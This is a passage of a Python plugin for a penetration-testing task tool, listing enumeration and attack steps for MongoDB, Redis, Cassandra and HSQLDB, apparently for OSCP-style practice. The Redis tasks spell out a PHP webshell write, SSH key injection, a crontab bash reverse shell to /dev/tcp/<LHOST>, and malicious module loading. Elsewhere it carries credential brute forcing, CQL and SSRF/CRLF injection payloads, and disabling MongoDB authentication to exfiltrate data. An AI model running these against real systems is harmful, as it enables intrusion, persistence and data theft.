"""
NoSQL database enumeration plugin

Generates tasks for NoSQL database enumeration including:
- MongoDB: Authentication bypass, NoSQL injection, ObjectID prediction, data extraction
- Redis: Unauthenticated access, RCE via webshell/SSH/cron/module loading, SSRF exploitation
- Cassandra: CQL injection, keyspace enumeration, credential extraction
- HSQLDB: Java routine exploitation, file write operations, privilege escalation
- H2 Database: Unauthenticated database creation, SQL injection to RCE
- Web Application NoSQL Injection: MongoDB operator injection, authentication bypass, blind extraction

Extracted from HackTricks:
- 27017-27018-mongodb.md
- 6379-pentesting-redis.md
- cassandra.md
- 9001-pentesting-hsqldb.md
- h2-java-sql-database.md
- nosql-injection.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class NoSQLPlugin(ServicePlugin):
    """NoSQL database enumeration plugin (MongoDB, Redis, Cassandra, HSQLDB, H2)"""

    @property
    def name(self) -> str:
        return "nosql"

    @property
    def default_ports(self) -> List[int]:
        return [27017, 27018, 6379, 9042, 9160, 9001]

    @property
    def service_names(self) -> List[str]:
        return ['mongodb', 'redis', 'cassandra', 'cassandra-native', 'hsqldb', 'h2', 'nosql']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect NoSQL database services

        Manual trigger only - user must explicitly enable via crack track manual
        Returns False to prevent auto-detection
        """
        # Manual trigger only to prevent auto-detection
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate NoSQL enumeration task tree"""

        service = service_info.get('service', '').lower()
        version = service_info.get('version', '')
        product = service_info.get('product', '')

        # Determine which NoSQL database type
        db_type = self._detect_database_type(service, product, port)

        tasks = {
            'id': f'nosql-enum-{port}',
            'name': f'NoSQL Database Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Route to appropriate database enumeration
        if db_type == 'mongodb':
            tasks['children'].extend(self._get_mongodb_tasks(target, port, version))
        elif db_type == 'redis':
            tasks['children'].extend(self._get_redis_tasks(target, port, version))
        elif db_type == 'cassandra':
            tasks['children'].extend(self._get_cassandra_tasks(target, port, version))
        elif db_type == 'hsqldb':
            tasks['children'].extend(self._get_hsqldb_tasks(target, port, version))
        elif db_type == 'h2':
            tasks['children'].extend(self._get_h2_tasks(target, port, version))
        else:
            # Generic NoSQL enumeration
            tasks['children'].extend(self._get_generic_nosql_tasks(target, port))

        return tasks

    def _detect_database_type(self, service: str, product: str, port: int) -> str:
        """Determine NoSQL database type"""
        service_lower = service.lower()
        product_lower = product.lower()

        if 'mongo' in service_lower or 'mongo' in product_lower or port in [27017, 27018]:
            return 'mongodb'
        elif 'redis' in service_lower or 'redis' in product_lower or port == 6379:
            return 'redis'
        elif 'cassandra' in service_lower or 'cassandra' in product_lower or port in [9042, 9160]:
            return 'cassandra'
        elif 'hsqldb' in service_lower or 'hsql' in product_lower or port == 9001:
            return 'hsqldb'
        elif 'h2' in service_lower or 'h2' in product_lower:
            return 'h2'

        return 'unknown'

    def _get_mongodb_tasks(self, target: str, port: int, version: str) -> List[Dict[str, Any]]:
        """Generate MongoDB enumeration tasks"""
        tasks = []

        # Task 1: Basic Connection Test (Unauthenticated)
        tasks.append({
            'id': f'mongodb-connect-{port}',
            'name': 'Test Unauthenticated MongoDB Access',
            'type': 'command',
            'metadata': {
                'command': f'mongo {target}:{port}',
                'description': 'Test anonymous MongoDB connection (often enabled by default)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'mongo': 'MongoDB shell client',
                    f'{target}:{port}': 'Target host and port'
                },
                'success_indicators': [
                    'MongoDB shell version displayed',
                    'Connection accepted without credentials',
                    'Prompt shows: >'
                ],
                'failure_indicators': [
                    'Authentication required',
                    'Connection refused',
                    'Network unreachable'
                ],
                'next_steps': [
                    'Run: show dbs (list databases)',
                    'Run: use <db> (switch database)',
                    'Run: show collections (list tables)',
                    'Dump data: db.<collection>.find()'
                ],
                'alternatives': [
                    f'nc {target} {port} (raw connection)',
                    f'Python: pymongo.MongoClient("{target}", {port})',
                    f'nmap --script mongodb-info -p {port} {target}'
                ],
                'notes': 'MongoDB often runs without authentication by default. Check /opt/bitnami/mongodb/mongodb.conf for noauth=true'
            }
        })

        # Task 2: Nmap Enumeration Scripts
        tasks.append({
            'id': f'mongodb-nmap-{port}',
            'name': 'Nmap MongoDB Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'nmap -sV --script "mongo* and default" -p {port} {target}',
                'description': 'Run all default MongoDB NSE scripts for comprehensive enumeration',
                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                'flag_explanations': {
                    '-sV': 'Version detection',
                    '--script "mongo* and default"': 'All MongoDB scripts in default category',
                    '-p': f'Target port {port}'
                },
                'success_indicators': [
                    'Server information retrieved',
                    'Database names enumerated',
                    'Authentication status revealed'
                ],
                'failure_indicators': [
                    'All scripts timed out',
                    'Connection filtered',
                    'Host unreachable'
                ],
                'next_steps': [
                    'Review discovered databases',
                    'Check if authentication required',
                    'Target admin database if accessible'
                ],
                'alternatives': [
                    'Manual connection via mongo shell',
                    'Python pymongo library enumeration'
                ],
                'estimated_time': '2-3 minutes'
            }
        })

        # Task 3: Manual Database Enumeration
        tasks.append({
            'id': f'mongodb-enum-dbs-{port}',
            'name': 'MongoDB Manual Database Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Manually enumerate MongoDB databases and collections',
                'tags': ['OSCP:HIGH', 'MANUAL'],
                'alternatives': [
                    f'mongo {target}:{port}',
                    'Commands:',
                    '  show dbs               # List all databases',
                    '  use <db>               # Switch to database',
                    '  show collections       # List collections',
                    '  db.<collection>.find() # Dump collection data',
                    '  db.<collection>.count()# Count records',
                    '  db.current.find({"username":"admin"}) # Search for admin'
                ],
                'success_indicators': [
                    'Database names revealed',
                    'Collections enumerated',
                    'Sensitive data found (users, passwords, tokens)'
                ],
                'notes': 'Target the "admin" database for administrative access. Look for user_auth, credentials, config collections'
            }
        })

        # Task 4: Credential Brute Force
        tasks.append({
            'id': f'mongodb-brute-{port}',
            'name': 'MongoDB Credential Brute Force',
            'type': 'command',
            'metadata': {
                'command': f'nmap -n -sV --script mongodb-brute -p {port} {target}',
                'description': 'Brute force MongoDB credentials if authentication required',
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                'flag_explanations': {
                    '-n': 'No DNS resolution (faster)',
                    '--script mongodb-brute': 'MongoDB brute force NSE script',
                    '-sV': 'Version detection'
                },
                'success_indicators': [
                    'Valid credentials found',
                    'Credentials: username/password displayed'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Account lockout triggered',
                    'Script timeout'
                ],
                'alternatives': [
                    'Manual credential testing: mongo <db> -u <user> -p <pass>',
                    'Python script with pymongo and wordlists',
                    'Metasploit: use auxiliary/scanner/mongodb/mongodb_login'
                ],
                'estimated_time': '10-30 minutes',
                'notes': 'Only use if authentication is required. Check config first: grep "auth.*true" /opt/bitnami/mongodb/mongodb.conf'
            }
        })

        # Task 5: Python Enumeration Script
        tasks.append({
            'id': f'mongodb-python-enum-{port}',
            'name': 'MongoDB Python Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Use Python pymongo for advanced enumeration',
                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                'alternatives': [
                    'Python script:',
                    'from pymongo import MongoClient',
                    f'client = MongoClient("{target}", {port})',
                    'print(client.server_info())  # Basic info',
                    'for db in client.list_databases():',
                    '    print(db)',
                    '    print(client[db["name"]].list_collection_names())',
                    '',
                    'If admin access:',
                    'admin = client.admin',
                    'admin_info = admin.command("serverStatus")'
                ],
                'success_indicators': [
                    'Server info retrieved',
                    'All databases enumerated',
                    'Collection data dumped'
                ],
                'notes': 'Install: pip install pymongo. Useful for scripting data extraction'
            }
        })

        # Task 6: MongoDB ObjectID Prediction Attack
        tasks.append({
            'id': f'mongodb-objectid-{port}',
            'name': 'MongoDB ObjectID Prediction (IDOR)',
            'type': 'manual',
            'metadata': {
                'description': 'Predict MongoDB ObjectIDs to access unauthorized records',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED'],
                'alternatives': [
                    'Tool: https://github.com/andresriancho/mongo-objectid-predict',
                    'Usage:',
                    '  1. Get a known ObjectID (create account)',
                    '  2. Run: python mongo-objectid-predict.py --object-id <ID>',
                    '  3. Brute force ~1000 predicted IDs',
                    '',
                    'ObjectID structure (12 bytes):',
                    '  - 5f2459ac: Timestamp (changes per second)',
                    '  - 9fa6dc: Machine ID (static)',
                    '  - 2500: Process ID (static until restart)',
                    '  - 314019: Counter (incremental)'
                ],
                'success_indicators': [
                    'Unauthorized records accessed',
                    'IDOR vulnerability confirmed',
                    'Other users data retrieved'
                ],
                'notes': 'Advanced technique for CTF/bug bounty. Useful when MongoDB is used for session/user management'
            }
        })

        # Task 7: Post-Exploitation (Root Access)
        tasks.append({
            'id': f'mongodb-post-exploit-{port}',
            'name': 'MongoDB Post-Exploitation (Disable Auth)',
            'type': 'manual',
            'metadata': {
                'description': 'If root access obtained, disable MongoDB authentication',
                'tags': ['POST_EXPLOIT', 'PRIVESC'],
                'alternatives': [
                    'With root access:',
                    '  1. Edit: /opt/bitnami/mongodb/mongodb.conf',
                    '  2. Set: noauth = true',
                    '  3. Restart: systemctl restart mongodb',
                    '  4. Connect: mongo <target> (no credentials needed)'
                ],
                'success_indicators': [
                    'Config modified successfully',
                    'MongoDB restarted',
                    'Anonymous access enabled'
                ],
                'notes': 'Requires root/admin access. Allows full database access for data exfiltration'
            }
        })

        # Exploit research if version detected
        if version:
            tasks.append(self._create_exploit_research('MongoDB', version, port))

        return tasks

    def _get_redis_tasks(self, target: str, port: int, version: str) -> List[Dict[str, Any]]:
        """Generate Redis enumeration tasks"""
        tasks = []

        # Task 1: Basic Connection Test
        tasks.append({
            'id': f'redis-connect-{port}',
            'name': 'Test Redis Unauthenticated Access',
            'type': 'command',
            'metadata': {
                'command': f'redis-cli -h {target} -p {port} INFO',
                'description': 'Test anonymous Redis connection and retrieve server information',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'redis-cli': 'Redis command-line client',
                    '-h': f'Target host {target}',
                    '-p': f'Target port {port}',
                    'INFO': 'Display server information (version, config, stats)'
                },
                'success_indicators': [
                    'Server information displayed',
                    'redis_version shown',
                    'No authentication error'
                ],
                'failure_indicators': [
                    '-NOAUTH Authentication required',
                    'Connection refused',
                    'Could not connect'
                ],
                'next_steps': [
                    'Run: INFO keyspace (list databases)',
                    'Run: SELECT <db> (switch database)',
                    'Run: KEYS * (list all keys)',
                    'Run: GET <key> (retrieve value)'
                ],
                'alternatives': [
                    f'nc {target} {port} then type: INFO',
                    f'telnet {target} {port} then type: INFO',
                    f'nmap --script redis-info -p {port} {target}'
                ],
                'notes': 'Redis often runs without authentication by default. Install: apt install redis-tools'
            }
        })

        # Task 2: Nmap Enumeration
        tasks.append({
            'id': f'redis-nmap-{port}',
            'name': 'Nmap Redis Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script redis-info -sV -p {port} {target}',
                'description': 'Automated Redis enumeration via nmap NSE',
                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                'flag_explanations': {
                    '--script redis-info': 'Redis information gathering NSE script',
                    '-sV': 'Version detection',
                    '-p': f'Target port {port}'
                },
                'success_indicators': [
                    'Redis version detected',
                    'Server configuration revealed',
                    'Database information shown'
                ],
                'alternatives': [
                    'Manual: redis-cli -h <target> INFO',
                    'Metasploit: use auxiliary/scanner/redis/redis_server'
                ],
                'estimated_time': '1-2 minutes'
            }
        })

        # Task 3: Authenticated Enumeration
        tasks.append({
            'id': f'redis-enum-{port}',
            'name': 'Redis Manual Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Manual Redis enumeration commands',
                'tags': ['OSCP:HIGH', 'MANUAL'],
                'alternatives': [
                    f'redis-cli -h {target} -p {port}',
                    'Commands:',
                    '  INFO                # Server info',
                    '  INFO keyspace       # List databases',
                    '  client list         # Connected clients',
                    '  CONFIG GET *        # Get all config (dangerous)',
                    '  SELECT <db>         # Switch database (0-15)',
                    '  KEYS *              # List all keys',
                    '  GET <key>           # Get key value',
                    '  TYPE <key>          # Check key type',
                    '  LRANGE <key> 0 -1   # Get list items',
                    '  HGETALL <key>       # Get hash items',
                    '  monitor             # Real-time command monitoring',
                    '  slowlog get 25      # Get 25 slowest queries'
                ],
                'success_indicators': [
                    'Database enumerated',
                    'Keys retrieved',
                    'Sensitive data found (sessions, credentials, tokens)'
                ],
                'notes': 'If auth required: AUTH <username> <password> or AUTH <password>. Default username is "default"'
            }
        })

        # Task 4: Database Dumping
        tasks.append({
            'id': f'redis-dump-{port}',
            'name': 'Redis Database Dump',
            'type': 'command',
            'metadata': {
                'command': f'redis-dump -h {target} -p {port} > redis_dump.json',
                'description': 'Dump entire Redis database to JSON for offline analysis',
                'tags': ['OSCP:MEDIUM', 'ENUM'],
                'flag_explanations': {
                    'redis-dump': 'Node.js tool for dumping Redis databases',
                    '-h': 'Target host',
                    '-p': 'Target port',
                    '> redis_dump.json': 'Save output to file'
                },
                'success_indicators': [
                    'JSON file created',
                    'All keys exported',
                    'Database structure preserved'
                ],
                'alternatives': [
                    'Install: npm install -g redis-dump',
                    'Python alternative: pip install redis-utils',
                    'Manual: Loop SELECT <db>, KEYS *, GET <key>'
                ],
                'estimated_time': '3-5 minutes',
                'notes': 'Useful for comprehensive data extraction. Analyze offline for credentials, sessions, sensitive data'
            }
        })

        # Task 5: Redis Authentication Brute Force
        tasks.append({
            'id': f'redis-brute-{port}',
            'name': 'Redis Credential Brute Force',
            'type': 'command',
            'metadata': {
                'command': f'hydra -P /usr/share/wordlists/rockyou.txt redis://{target}:{port}',
                'description': 'Brute force Redis authentication if required',
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                'flag_explanations': {
                    'hydra': 'Credential brute force tool',
                    '-P': 'Password wordlist',
                    'redis://': 'Redis protocol',
                    f'{target}:{port}': 'Target and port'
                },
                'success_indicators': [
                    'Valid password found',
                    '[6379][redis] host: password:'
                ],
                'failure_indicators': [
                    'All attempts failed',
                    'Connection timeout',
                    'Rate limited'
                ],
                'alternatives': [
                    'Manual testing: redis-cli -h <target> -a <password>',
                    'Custom Python script with redis-py',
                    'Metasploit: use auxiliary/scanner/redis/redis_login'
                ],
                'estimated_time': '15-60 minutes',
                'notes': 'Only if -NOAUTH error received. Redis passwords often weak (check common passwords first)'
            }
        })

        # Task 6: RCE - PHP Webshell
        tasks.append({
            'id': f'redis-rce-webshell-{port}',
            'name': 'Redis RCE via PHP Webshell',
            'type': 'manual',
            'metadata': {
                'description': 'Write PHP webshell to web root via Redis config manipulation',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE'],
                'alternatives': [
                    'Requirements: Know web root path (/var/www/html, /usr/share/nginx/html)',
                    '',
                    'Commands:',
                    f'redis-cli -h {target}',
                    'config set dir /var/www/html',
                    'config set dbfilename shell.php',
                    'set test "<?php system($_GET[\'cmd\']); ?>"',
                    'save',
                    '',
                    'Access: http://<target>/shell.php?cmd=id'
                ],
                'success_indicators': [
                    'File written successfully',
                    'Webshell accessible via browser',
                    'Command execution confirmed'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Web root path incorrect',
                    'Redis config locked'
                ],
                'next_steps': [
                    'Upload reverse shell',
                    'Enumerate system with webshell',
                    'Establish persistent access'
                ],
                'notes': 'May corrupt database. Backup first: CONFIG GET dir/dbfilename. Restore after: config set dir <original>'
            }
        })

        # Task 7: RCE - SSH Key Injection
        tasks.append({
            'id': f'redis-rce-ssh-{port}',
            'name': 'Redis RCE via SSH Key Injection',
            'type': 'manual',
            'metadata': {
                'description': 'Inject SSH public key into authorized_keys for passwordless access',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE'],
                'alternatives': [
                    'Steps:',
                    '1. Generate SSH key: ssh-keygen -t rsa -f redis_key',
                    '2. Format key: (echo -e "\\n\\n"; cat redis_key.pub; echo -e "\\n\\n") > key.txt',
                    f'3. Import key: cat key.txt | redis-cli -h {target} -x set ssh_key',
                    f'4. Write to authorized_keys: redis-cli -h {target}',
                    '   config set dir /var/lib/redis/.ssh',
                    '   config set dbfilename "authorized_keys"',
                    '   save',
                    '5. SSH: ssh -i redis_key redis@<target>',
                    '',
                    'Alternative user: /home/<username>/.ssh/authorized_keys'
                ],
                'success_indicators': [
                    'SSH key written successfully',
                    'SSH connection established',
                    'Shell access as redis user'
                ],
                'failure_indicators': [
                    'Permission denied',
                    '~/.ssh directory does not exist',
                    'SSH service not running'
                ],
                'next_steps': [
                    'Enumerate system as redis user',
                    'Check sudo permissions: sudo -l',
                    'Escalate to root'
                ],
                'notes': 'Automated: https://github.com/Avinash-acid/Redis-Server-Exploit. Brute force users: https://github.com/captain-woof/redis-rce-ssh'
            }
        })

        # Task 8: RCE - Crontab Injection
        tasks.append({
            'id': f'redis-rce-cron-{port}',
            'name': 'Redis RCE via Crontab Injection',
            'type': 'manual',
            'metadata': {
                'description': 'Inject reverse shell into crontab for automated execution',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RCE'],
                'alternatives': [
                    'Setup listener: nc -nlvp 4444',
                    '',
                    'Inject cron job:',
                    f'echo -e "\\n\\n*/1 * * * * /bin/bash -c \'bash -i >& /dev/tcp/<LHOST>/4444 0>&1\'\\n\\n" | redis-cli -h {target} -x set cronjob',
                    f'redis-cli -h {target}',
                    'config set dir /var/spool/cron/crontabs/',  # Ubuntu
                    'config set dbfilename root',
                    'save',
                    '',
                    'CentOS path: /var/spool/cron/'
                ],
                'success_indicators': [
                    'Crontab written',
                    'Reverse shell received within 1 minute',
                    'Root shell obtained'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Cron path incorrect',
                    'Cron not processing jobs'
                ],
                'next_steps': [
                    'Stabilize shell: python -c "import pty;pty.spawn(\'/bin/bash\')"',
                    'Enumerate system',
                    'Capture flags'
                ],
                'notes': 'Wait up to 1 minute for cron execution. Payload runs every minute until stopped'
            }
        })

        # Task 9: RCE - Redis Module Loading
        tasks.append({
            'id': f'redis-rce-module-{port}',
            'name': 'Redis RCE via Module Loading',
            'type': 'manual',
            'metadata': {
                'description': 'Load malicious Redis module for arbitrary command execution',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'RCE', 'ADVANCED'],
                'alternatives': [
                    'Setup:',
                    '1. git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand',
                    '2. cd RedisModules-ExecuteCommand',
                    '3. make',
                    '4. Upload module.so to target (HTTP server, Redis write)',
                    '',
                    'Execute:',
                    f'redis-cli -h {target}',
                    'MODULE LOAD /path/to/module.so',
                    'MODULE LIST  # Verify loaded',
                    'system.exec "id"',
                    'system.exec "whoami"',
                    'system.rev <LHOST> 4444  # Reverse shell',
                    '',
                    'Cleanup:',
                    'MODULE UNLOAD mymodule'
                ],
                'success_indicators': [
                    'Module loaded successfully',
                    'Command execution works',
                    'Reverse shell received'
                ],
                'failure_indicators': [
                    'Module loading disabled',
                    'Permission denied',
                    'Module not found'
                ],
                'notes': 'Requires file upload capability. More stealth than webshell (no web logs)'
            }
        })

        # Task 10: RCE - Interactive Shell (Automated)
        tasks.append({
            'id': f'redis-rce-auto-{port}',
            'name': 'Redis Automated RCE (redis-rogue-server)',
            'type': 'command',
            'metadata': {
                'command': f'python3 redis-rogue-server.py --rhost {target} --lhost <LHOST>',
                'description': 'Automated Redis RCE for Redis <= 5.0.5',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE', 'AUTOMATED'],
                'flag_explanations': {
                    'redis-rogue-server.py': 'Automated Redis exploitation tool',
                    '--rhost': 'Target Redis server',
                    '--lhost': 'Attacker IP for callback'
                },
                'success_indicators': [
                    'Interactive shell spawned',
                    'Shell prompt received',
                    'Commands execute successfully'
                ],
                'failure_indicators': [
                    'Redis version > 5.0.5',
                    'Connection refused',
                    'Exploit failed'
                ],
                'alternatives': [
                    'Manual exploitation via module loading',
                    'SSH key injection',
                    'Webshell upload'
                ],
                'notes': 'Tool: https://github.com/n0b0dyCN/redis-rogue-server. Only works on Redis <= 5.0.5'
            }
        })

        # Task 11: LUA Sandbox Bypass
        tasks.append({
            'id': f'redis-lua-bypass-{port}',
            'name': 'Redis LUA Sandbox Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Escape LUA sandbox for command execution',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED'],
                'alternatives': [
                    'Check for CVE-2022-0543:',
                    'https://github.com/aodsec/CVE-2022-0543',
                    '',
                    'Old technique (patched):',
                    'EVAL "dofile(\'/etc/passwd\')" 0',
                    '',
                    'DoS via LUA (testing):',
                    'EVAL "while true do end" 0'
                ],
                'success_indicators': [
                    'LUA sandbox escaped',
                    'File read successful',
                    'Command execution achieved'
                ],
                'notes': 'Mostly patched in modern Redis. Check CVE databases for version-specific bypasses'
            }
        })

        # Task 12: SSRF to Redis Exploitation
        tasks.append({
            'id': f'redis-ssrf-{port}',
            'name': 'Redis Exploitation via SSRF',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit Redis through SSRF vulnerability in web application',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'WEB'],
                'alternatives': [
                    'Requirements: SSRF vuln + CRLF injection in web app',
                    '',
                    'Redis reads line-by-line, ignoring invalid commands:',
                    '-ERR unknown command "Host:"',
                    '-ERR unknown command "Accept:"',
                    '',
                    'Inject Redis commands via SSRF:',
                    'URL: http://target/import?url=http://127.0.0.1:6379/SET%20test%20value',
                    '',
                    'GitLab example (CVE-2018-19571):',
                    'git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0Amulti%0D%0A...',
                    '',
                    'Inject malicious commands via HTTP headers/params with %0D%0A'
                ],
                'success_indicators': [
                    'Redis commands executed',
                    'Webshell written',
                    'RCE achieved'
                ],
                'notes': 'Combine SSRF + CRLF for Redis protocol injection. See: https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/'
            }
        })

        # Exploit research if version detected
        if version:
            tasks.append(self._create_exploit_research('Redis', version, port))

        return tasks

    def _get_cassandra_tasks(self, target: str, port: int, version: str) -> List[Dict[str, Any]]:
        """Generate Cassandra enumeration tasks"""
        tasks = []

        # Task 1: Basic Connection Test
        tasks.append({
            'id': f'cassandra-connect-{port}',
            'name': 'Test Cassandra Unauthenticated Access',
            'type': 'command',
            'metadata': {
                'command': f'cqlsh {target} {port}',
                'description': 'Connect to Cassandra via CQL shell (often accepts any credentials)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'cqlsh': 'Cassandra Query Language shell',
                    f'{target}': 'Target hostname/IP',
                    f'{port}': 'Cassandra port (9042 or 9160)'
                },
                'success_indicators': [
                    'Connected to Cassandra',
                    'cqlsh> prompt displayed',
                    'No authentication error'
                ],
                'failure_indicators': [
                    'Authentication required',
                    'Connection refused',
                    'Protocol version mismatch'
                ],
                'next_steps': [
                    'SELECT cluster_name FROM system.local;',
                    'SELECT keyspace_name FROM system.schema_keyspaces;',
                    'desc <keyspace_name>',
                    'SELECT * from system_auth.roles;'
                ],
                'alternatives': [
                    'Install: pip install cqlsh',
                    'Alternative: use Cassandra Python driver',
                    f'nmap --script cassandra-info -p {port} {target}'
                ],
                'notes': 'Cassandra often accepts any credentials when not configured. Try without username/password first'
            }
        })

        # Task 2: Nmap Enumeration
        tasks.append({
            'id': f'cassandra-nmap-{port}',
            'name': 'Nmap Cassandra Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'nmap -sV --script cassandra-info -p {port} {target}',
                'description': 'Automated Cassandra enumeration via nmap',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                'flag_explanations': {
                    '-sV': 'Service version detection',
                    '--script cassandra-info': 'Cassandra information gathering NSE',
                    '-p': f'Target port {port}'
                },
                'success_indicators': [
                    'Cluster name revealed',
                    'Version information displayed',
                    'Protocol versions listed'
                ],
                'alternatives': [
                    'Manual CQL queries',
                    'Python cassandra-driver enumeration'
                ],
                'notes': 'Limited information from nmap. Manual CQL enumeration more comprehensive',
                'estimated_time': '1-2 minutes'
            }
        })

        # Task 3: Manual Keyspace Enumeration
        tasks.append({
            'id': f'cassandra-enum-keyspaces-{port}',
            'name': 'Cassandra Keyspace Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Manually enumerate Cassandra keyspaces and tables',
                'tags': ['OSCP:HIGH', 'MANUAL'],
                'alternatives': [
                    f'cqlsh {target} {port}',
                    'Commands:',
                    '',
                    '# Basic info',
                    'SELECT cluster_name, thrift_version, data_center, partitioner,',
                    '       native_protocol_version, rack, release_version',
                    'FROM system.local;',
                    '',
                    '# List keyspaces (databases)',
                    'SELECT keyspace_name FROM system.schema_keyspaces;',
                    '',
                    '# Describe keyspace',
                    'desc <Keyspace_name>',
                    'desc system_auth',
                    '',
                    '# Extract credentials',
                    'SELECT * from system_auth.roles;',
                    'SELECT * from logdb.user_auth;',
                    'SELECT * from logdb.user;',
                    'SELECT * from configuration."config";'
                ],
                'success_indicators': [
                    'Keyspace names retrieved',
                    'Table structures enumerated',
                    'Credential hashes found in system_auth.roles'
                ],
                'notes': 'Focus on system_auth keyspace for credentials. Check logdb, configuration for app-specific data'
            }
        })

        # Task 4: Credential Extraction
        tasks.append({
            'id': f'cassandra-creds-{port}',
            'name': 'Cassandra Credential Extraction',
            'type': 'manual',
            'metadata': {
                'description': 'Extract password hashes from Cassandra',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'alternatives': [
                    'Target tables:',
                    'SELECT * from system_auth.roles;          # User credentials',
                    'SELECT * from logdb.user_auth;            # Application users',
                    'SELECT * from configuration."config";     # Config data',
                    '',
                    'Crack hashes:',
                    'john --format=bcrypt hashes.txt',
                    'hashcat -m 3200 hashes.txt wordlist.txt'
                ],
                'success_indicators': [
                    'Password hashes extracted',
                    'Hashes cracked successfully',
                    'Valid credentials obtained'
                ],
                'next_steps': [
                    'Use credentials for authentication',
                    'Test credentials on other services (SSH, SMB)',
                    'Enumerate with elevated privileges'
                ],
                'notes': 'Cassandra stores bcrypt hashes in system_auth. Prioritize weak/default passwords'
            }
        })

        # Task 5: Cassandra Brute Force
        tasks.append({
            'id': f'cassandra-brute-{port}',
            'name': 'Cassandra Credential Brute Force',
            'type': 'manual',
            'metadata': {
                'description': 'Brute force Cassandra authentication if required',
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                'alternatives': [
                    'No dedicated Cassandra brute force tools in Kali',
                    '',
                    'Manual testing:',
                    'cqlsh <target> <port> -u <username> -p <password>',
                    '',
                    'Common defaults:',
                    '  cassandra:cassandra',
                    '  admin:admin',
                    '  root:root',
                    '',
                    'Python script with cassandra-driver:',
                    'from cassandra.cluster import Cluster',
                    'from cassandra.auth import PlainTextAuthProvider',
                    '# Loop through wordlist'
                ],
                'success_indicators': [
                    'Valid credentials found',
                    'Authenticated session established'
                ],
                'notes': 'Rate limiting may apply. Test default credentials first',
                'estimated_time': '10-20 minutes'
            }
        })

        # Task 6: CQL Injection Testing
        tasks.append({
            'id': f'cassandra-sqli-{port}',
            'name': 'Cassandra CQL Injection Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test for CQL injection vulnerabilities in application',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'WEB'],
                'alternatives': [
                    'If web app uses Cassandra backend:',
                    '',
                    'Test injection points:',
                    "username' OR 1=1--",
                    "id' ALLOW FILTERING--",
                    '',
                    'CQL-specific syntax:',
                    '  No UNION, no stacked queries',
                    '  ALLOW FILTERING for expanded results',
                    '  Limited error-based injection',
                    '',
                    'Time-based blind:',
                    "' AND now() = now()--"
                ],
                'success_indicators': [
                    'Syntax errors reveal CQL usage',
                    'Authentication bypass achieved',
                    'Unauthorized data access'
                ],
                'notes': 'CQL injection less common than SQL. Focus on authentication bypass and ALLOW FILTERING abuse'
            }
        })

        # Exploit research if version detected
        if version:
            tasks.append(self._create_exploit_research('Cassandra', version, port))

        return tasks

    def _get_hsqldb_tasks(self, target: str, port: int, version: str) -> List[Dict[str, Any]]:
        """Generate HSQLDB enumeration tasks"""
        tasks = []

        # Task 1: Connection Test
        tasks.append({
            'id': f'hsqldb-connect-{port}',
            'name': 'HSQLDB Connection Test',
            'type': 'manual',
            'metadata': {
                'description': 'Connect to HSQLDB using GUI or JDBC',
                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                'alternatives': [
                    'Download HSQLDB:',
                    'wget https://sourceforge.net/projects/hsqldb/files/latest/download',
                    'unzip hsqldb-*.zip',
                    'cd hsqldb/lib',
                    '',
                    'Launch GUI:',
                    'java -jar hsqldb.jar',
                    '',
                    'Connection URL:',
                    f'jdbc:hsqldb:hsql://{target}:{port}/DBNAME',
                    '',
                    'Default credentials:',
                    '  Username: sa',
                    '  Password: (blank)'
                ],
                'success_indicators': [
                    'Connection established',
                    'Database browser displayed',
                    'Tables enumerable'
                ],
                'failure_indicators': [
                    'Connection refused',
                    'Invalid database name',
                    'Authentication failed'
                ],
                'next_steps': [
                    'Enumerate tables',
                    'Extract credentials',
                    'Test Java routine exploitation'
                ],
                'notes': 'HSQLDB often bound to localhost. If accessible externally, likely from prior compromise'
            }
        })

        # Task 2: Credential Discovery
        tasks.append({
            'id': f'hsqldb-creds-{port}',
            'name': 'HSQLDB Credential Discovery',
            'type': 'manual',
            'metadata': {
                'description': 'Search for HSQLDB credentials in application files',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'alternatives': [
                    'If shell access obtained, search for credentials:',
